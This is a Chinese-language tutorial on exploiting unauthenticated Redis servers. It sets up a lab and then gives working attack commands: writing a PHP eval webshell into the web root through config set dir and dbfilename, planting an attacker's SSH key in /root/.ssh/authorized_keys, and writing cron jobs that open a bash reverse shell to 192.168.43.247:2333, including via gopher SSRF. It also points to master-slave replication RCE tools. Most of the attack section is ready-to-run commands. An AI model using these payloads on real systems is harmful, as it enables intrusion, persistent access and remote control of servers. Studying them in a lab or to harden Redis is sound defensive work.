****Redis 安全**** ** **介绍****

Redis默认没有设置密码验证，3.x之前默认开启远程连接，默认开启6379端口。

如果目标主机端口扫描发现6379端口开放服务，可特别注意下。

通过 redis 的配置文件设置密码参数，这样客户端连接到 redis 服务就需要密码验证，这样可以让你的 redis 服务更安全。

###  ** **Redis环境搭建****

第一步：ubuntu中下载安装Redis并解压：

wget http://download.redis.io/releases/redis-5.0.12.tar.gz

tar -zxvf redis-5.0.12.tar.gz

第二步：下载并解压好以后，进入到Redis目录中，执行make，通过make编译的方式来安装。

第三步：make结束后，进入src目录，将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）

第四步：返回redis-2.8.17目录，将redis.conf拷贝到/etc目录下。

第五步：使用/etc目录下的reids.conf文件中的配置启动redis服务：redis-server /etc/redis.conf

##  ** **漏洞利用****

###  ** **Redis**** ** **未**** ** **授权访问漏洞****

Redis默认情况下启动，绑定0.0.0.0:6379，且密码认证默认为空，如何该服务暴露在公网上会导致任意用户访问目标服务器，从而达到未授权访问Redis以及获取Redis数据。需要对web的路径进行获取。

> 利用环境搭建，搭建redis服务和web服务，本环境web路径是/var/www/html/。
>
> 使用攻击机进行非授权访问目标主机，并写入webshell，具体操作如下：

![](https://image.3001.net/images/20211121/1637486924_619a114ce320cdd3401a8.png!small)

“\r\n\r\n”代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行，查看/var/www/html/目录下的shell.php文件内容。

需要redis-server是root权限启动。远程可写入数据。

使用蚁剑进行连接之前写入的webshell：

![](https://image.3001.net/images/20211121/1637486963_619a1173b8020d4dc7690.png!small)

 ** **利用Redis**** ** **写入**** ** **SSH**** ** **公**** ** **钥****

（1）利用条件：服务端的Redis连接存在未授权，在攻击机上能用redis-cli直接登陆连接，并未登陆验证。

服务端存在.ssh目录并且有写入的权限 且前提是~/.ssh目录存在，如果不存在我们可以写入任务来创建该目录。。

（2）漏洞原理：在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生成一个授权的key。

（3）实现过程：首先在攻击机的/root/.ssh目录里生成ssh公钥key：ssh-keygen -t rsa。

![](https://image.3001.net/images/20211121/1637487112_619a120827821b8436cf3.png!small)

接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：

$(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") >
/root/.ssh/key.txt

$cat /root/.ssh/key.txt | redis-cli -h 192.168.43.82 -x set xxx

![](https://image.3001.net/images/20211121/1637487131_619a121b2e3b93eeb67ad.png!small)

然后，使用攻击机连接目标机器Redis，设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上

$redis-cli -h 192.168.43.82  
  
---  
  
$config set dir /root/.ssh  
  
$config set dbfilename authorized_keys  
  
$save  
  
![](https://image.3001.net/images/20211121/1637487156_619a12345714457b33535.png!small)

同理可以利用此方法在Redis 写入webshell 进行定时反弹shell操作。

###  ** **Redis**** ** **反弹shell****

攻击机 监听端口 nc -lvp 2333并目标机器写反弹shell。

redis-cli -h 192.168.142.153

set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.43.247/2333 0>&1\n\n"

config set dir /var/spool/cron/crontabs/ #测试该位置没有写入权限，需要赋予644

config set dbfilename root

save

如下图所示，经过一分钟以后，在攻击机的nc中成功反弹shell回来：

注明：搭建过程发现，需要ssh开启服务在指定目录下生成秘钥id_rsa(私钥)和id_rsa.pub(公钥)。

##  ** **Redis 配合gopher协议进行SSRF****

在SSRF漏洞中，如果通过端口扫描等方法发现目标主机上开放6379端口，则目标主机上很有可能存在Redis服务。此时，如果目标主机上的Redis由于没有设置密码认证或者弱密码、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用
Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。

思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。

redis常见的SSRF攻击方式大概有这几种：

绝对路径写webshell

    
    
    flushall
    set 1 '<?php eval($_GET["cmd"]);?>'
    config set dir /var/www/html
    config set dbfilename shell.php
    save

![](https://image.3001.net/images/20211121/1637487181_619a124ddc41ff2fe8a84.png!small)

写ssh公钥

如果.ssh目录存在，则直接写入~/.ssh/authorized_keys

如果不存在，则可以利用crontab创建该目录

写任务反弹shell

    
    
    flushall
    set 1 '\n\n*/1 * * * * bash -i >& /dev/tcp/192.168.43.247/2333 0>&1\n\n'
    config set dir /var/spool/cron/
    config set dbfilename root
    save

利用redis进行写入反弹Shell只能Centos上使用，Ubuntu上行不通，原因如下：

>
> 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件/var/spool/cron/crontabs/<username>权限必须是600也就是-> rw才会执行，否则会报错(root) INSECURE MODE (mode 0600
> expected)，而Centos的定时任务文件/var/spool/cron/<username>权限644也能执行。因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错。

由于系统的不同，crontrab定时文件位置也会不同：

> Centos的定时任务文件在/var/spool/cron/<username>
>
> Ubuntu定时任务文件在/var/spool/cron/crontabs/<username>

##  ** **Redis 基于主从复制的命令执行****

主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。

redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中，但是如果硬盘的数据被删除的话数据就无法恢复了，如果通过主从复制就能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis。

![](https://image.3001.net/images/20211121/1637487202_619a1262529532fe18148.png!small)

如何建立主从复制，有3种方式：

> 配置文件写入slaveof <master_ip> <master_port>
>
> redis-server启动命令后加入 --slaveof <master_ip> <master_port>
>
> 连接到客户端之后执行：slaveof <master_ip> <master_port>

1、Redis 主从复制进行 RCE

在Reids
4.x/5.X之后，Redis新增了模块功能，通过外部拓展，可以在Redis中实现一个新的Redis命令。我们可以通过外部拓展（.so），在Redis中创建一个用于执行系统命令的函数。

（1）利用 redis-rogue-server 工具

该工具只能在目标存在Redis未授权访问漏洞时使用。如果目标Redis存在密码是不能使用该工具的。![](https://image.3001.net/images/20211121/1637487231_619a127fc9fb41edf2668.png!small)

（2）利用 redis-rce 工具，可自行查找github

